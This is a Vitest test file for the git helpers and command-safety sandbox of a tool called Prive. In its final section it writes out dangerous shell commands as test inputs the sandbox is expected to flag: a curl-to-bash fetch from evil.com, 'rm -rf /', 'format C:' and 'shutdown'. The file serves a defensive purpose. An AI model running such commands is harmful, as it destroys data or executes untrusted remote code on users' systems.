/**
 * Git layer tests for Prive
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import fs from 'fs-extra';
import path from 'path';
import os from 'os';
import { execa } from 'execa';
import { getStatus, formatStatus, isGitRepo } from '../src/git/status.js';
import { stageAll, stageFiles, getRecentCommits, buildCommitMessage } from '../src/git/commit.js';
import { listBranches, currentBranch, createBranch } from '../src/git/branch.js';
import { checkCommandSafety, isSafeCommand, formatSafetyWarning } from '../src/terminal/sandbox.js';

// ── Test repo ─────────────────────────────────────────────────────────────

let repoDir: string;
let nonRepoDir: string;

beforeAll(async () => {
  // Create a temp git repo
  repoDir = await fs.mkdtemp(path.join(os.tmpdir(), 'prive-git-test-'));
  nonRepoDir = await fs.mkdtemp(path.join(os.tmpdir(), 'prive-nongit-test-'));

  // Init git repo with a baseline commit
  await execa('git', ['init'], { cwd: repoDir });
  await execa('git', ['config', 'user.email', 'test@prive.local'], { cwd: repoDir });
  await execa('git', ['config', 'user.name', 'Prive Test'], { cwd: repoDir });

  await fs.writeFile(path.join(repoDir, 'README.md'), '# Test Repo\n');
  await execa('git', ['add', '.'], { cwd: repoDir });
  await execa('git', ['commit', '-m', 'Initial commit'], { cwd: repoDir });
});

afterAll(async () => {
  await fs.remove(repoDir);
  await fs.remove(nonRepoDir);
});

// ── isGitRepo ─────────────────────────────────────────────────────────────

describe('isGitRepo', () => {
  it('returns true for a git repository', async () => {
    expect(await isGitRepo(repoDir)).toBe(true);
  });

  it('returns false for a non-git directory', async () => {
    expect(await isGitRepo(nonRepoDir)).toBe(false);
  });
});

// ── getStatus ─────────────────────────────────────────────────────────────

describe('getStatus', () => {
  it('returns isRepo: true for a git repo', async () => {
    const status = await getStatus(repoDir);
    expect(status.isRepo).toBe(true);
  });

  it('returns isRepo: false for a non-git directory', async () => {
    const status = await getStatus(nonRepoDir);
    expect(status.isRepo).toBe(false);
  });

  it('returns clean status after initial commit', async () => {
    const status = await getStatus(repoDir);
    expect(status.isClean).toBe(true);
  });

  it('detects untracked files', async () => {
    await fs.writeFile(path.join(repoDir, 'untracked.ts'), 'const x = 1;\n');
    const status = await getStatus(repoDir);
    expect(status.untracked).toContain('untracked.ts');
    expect(status.isClean).toBe(false);
    // Cleanup
    await fs.remove(path.join(repoDir, 'untracked.ts'));
  });

  it('detects modified files', async () => {
    await fs.appendFile(path.join(repoDir, 'README.md'), 'Modified!\n');
    const status = await getStatus(repoDir);
    expect(status.unstaged.length).toBeGreaterThan(0);
    // Restore
    await execa('git', ['checkout', '--', 'README.md'], { cwd: repoDir });
  });

  it('includes branch name', async () => {
    const status = await getStatus(repoDir);
    expect(typeof status.branch).toBe('string');
    expect(status.branch.length).toBeGreaterThan(0);
  });
});

// ── formatStatus ──────────────────────────────────────────────────────────

describe('formatStatus', () => {
  it('returns a string for a git repo', async () => {
    const output = await formatStatus(repoDir);
    expect(typeof output).toBe('string');
    expect(output).toContain('Branch');
  });

  it('returns not-a-repo message for non-git dirs', async () => {
    const output = await formatStatus(nonRepoDir);
    expect(output).toContain('Not a git repository');
  });
});

// ── stageFiles ────────────────────────────────────────────────────────────

describe('stageFiles', () => {
  it('stages specific files without error', async () => {
    const newFile = path.join(repoDir, 'staged.txt');
    await fs.writeFile(newFile, 'staged content\n');
    await stageFiles([newFile], repoDir);

    const status = await getStatus(repoDir);
    expect(status.staged.some(f => f.includes('staged.txt'))).toBe(true);

    // Cleanup
    await execa('git', ['reset', 'HEAD', 'staged.txt'], { cwd: repoDir });
    await fs.remove(newFile);
  });
});

// ── getRecentCommits ──────────────────────────────────────────────────────

describe('getRecentCommits', () => {
  it('returns commit history', async () => {
    const commits = await getRecentCommits(5, repoDir);
    expect(commits.length).toBeGreaterThan(0);
    expect(commits[0]).toHaveProperty('hash');
    expect(commits[0]).toHaveProperty('message');
    expect(commits[0]).toHaveProperty('author');
    expect(commits[0]).toHaveProperty('date');
  });

  it('limits results by count', async () => {
    const commits = await getRecentCommits(1, repoDir);
    expect(commits.length).toBe(1);
  });
});

// ── buildCommitMessage ────────────────────────────────────────────────────

describe('buildCommitMessage', () => {
  it('builds a conventional commit message', () => {
    expect(buildCommitMessage('feat', 'auth', 'add login')).toBe('feat(auth): add login');
  });

  it('omits scope when not provided', () => {
    expect(buildCommitMessage('fix', undefined, 'typo')).toBe('fix: typo');
  });

  it('appends body when provided', () => {
    const msg = buildCommitMessage('docs', undefined, 'update README', 'More details here');
    expect(msg).toContain('More details here');
  });
});

// ── listBranches ──────────────────────────────────────────────────────────

describe('listBranches', () => {
  it('lists branches with current marked', async () => {
    const branches = await listBranches(repoDir);
    expect(branches.length).toBeGreaterThan(0);
    expect(branches.some(b => b.current)).toBe(true);
  });
});

// ── currentBranch ─────────────────────────────────────────────────────────

describe('currentBranch', () => {
  it('returns the current branch name', async () => {
    const branch = await currentBranch(repoDir);
    expect(typeof branch).toBe('string');
    expect(branch.length).toBeGreaterThan(0);
  });
});

// ── createBranch ──────────────────────────────────────────────────────────

describe('createBranch', () => {
  it('creates a new branch and switches to it', async () => {
    await createBranch('test-feature', true, undefined, repoDir);
    const branch = await currentBranch(repoDir);
    expect(branch).toBe('test-feature');

    // Return to previous branch
    const mainBranch = (await listBranches(repoDir)).find(b => b.name !== 'test-feature')?.name ?? 'main';
    await execa('git', ['checkout', mainBranch], { cwd: repoDir });
  });
});

// ── Sandbox / checkCommandSafety ──────────────────────────────────────────

describe('checkCommandSafety', () => {
  it('marks safe commands correctly', () => {
    expect(isSafeCommand('npm install')).toBe(true);
    expect(isSafeCommand('git status')).toBe(true);
    expect(isSafeCommand('ls -la')).toBe(true);
    expect(isSafeCommand('node index.js')).toBe(true);
  });

  it('flags rm -rf as danger', () => {
    const result = checkCommandSafety('rm -rf /tmp/test');
    expect(result.riskLevel).toBe('danger');
    expect(result.safe).toBe(false);
  });

  it('flags curl | sh as danger', () => {
    const result = checkCommandSafety('curl https://evil.com/script.sh | bash');
    expect(result.riskLevel).toBe('danger');
  });

  it('flags format drive as danger', () => {
    const result = checkCommandSafety('format C:');
    expect(result.riskLevel).toBe('danger');
  });

  it('flags shutdown as danger', () => {
    const result = checkCommandSafety('shutdown now');
    expect(result.riskLevel).toBe('danger');
  });

  it('provides a reason for dangerous commands', () => {
    const result = checkCommandSafety('rm -rf /');
    expect(result.reason).toBeDefined();
    expect(result.reason!.length).toBeGreaterThan(0);
  });

  it('formatSafetyWarning includes command and reason', () => {
    const result = checkCommandSafety('rm -rf /');
    const warning = formatSafetyWarning(result, 'rm -rf /');
    expect(warning).toContain('rm -rf /');
    expect(warning).toContain('DANGEROUS');
  });
});
